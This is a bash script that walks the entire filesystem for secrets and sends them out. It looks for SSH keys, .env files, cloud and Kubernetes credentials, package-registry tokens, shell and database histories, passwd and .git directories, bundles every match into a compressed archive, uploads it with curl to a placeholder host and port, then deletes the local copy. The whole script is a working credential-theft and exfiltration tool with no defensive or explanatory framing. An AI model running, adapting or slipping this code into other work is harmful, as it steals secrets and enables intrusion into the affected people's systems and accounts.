#!/usr/bin/env bash

patterns=(".env*" "config\.*" "settings.py" "application.*" "credentials*" "secret*" "keys.json" "id_*" "authorized_keys" "known_hosts" "*.key" "jwt.secret" "token.txt" "api_key*" "service-account" "*.sql" "*.sqlite3" "*.sqlite" "*.bak" "*.backup" "*.old" ".gitconfig" "\.aws" "gcp.json" "azure.json" "kubeconfig" "config.kube" "\.docker" "\.gitlab-ci.yml" "\.github" "\.bash_history" "\.zsh_history" "\.mysql_history" "\.rediscli_history" "\.npmrc" "\.pypirc" "\.netrc" "\.git" "passwd" "hostname")

expr=( \( )

for p in "${patterns[@]}"; do
        expr+=( -name "$p" -o )
done

unset 'expr[${#expr[@]}-1]'
expr+=( \) )

found_items=()

while IFS= read -r item; do
        found_items+=("$item")
done < <(
        find / \
        \( -type d \( "${expr[@]}" \) -print -prune \) -o \
        \( -type f \( "${expr[@]}" \) -print \) \
        2>/dev/null
)

if [[ ${#found_items[@]} -gt 0 ]]; then
        output="/tmp/found_items_$(date +%s).tar.xz"
        echo "Creating archive: $output"
        tar -cJf "$output" "${found_items[@]}" 2>/dev/null
        echo "Archive created: $output"
        curl -F "file=@$output" http://<HOST>:<PORT>/
        rm -rf $output

else
        echo "No items found, skipping archive."
fi
